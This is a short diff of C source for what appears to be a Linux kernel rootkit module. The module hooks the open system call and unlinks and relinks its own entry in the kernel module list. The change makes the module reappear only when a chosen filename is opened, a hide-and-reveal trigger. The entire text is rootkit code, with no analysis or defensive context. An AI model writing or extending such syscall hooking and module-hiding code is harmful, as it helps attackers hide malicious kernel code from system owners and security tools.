@@ -25,13 +25,12 @@ asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_
 	char fname[256] ;
 
 	copy_from_user(fname, filename, 256) ;
-	pr_info("cat block return link\n");
-	modules_list = THIS_MODULE->list;
-	(&modules_list)->next = n;
-	(&modules_list)->prev = p;
+	
+	
 	
 	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
 		count++ ;
+		pr_info("cat block return link\n");
 		modules_list = THIS_MODULE->list;
 		(&modules_list)->next = n;
 		(&modules_list)->prev = p;
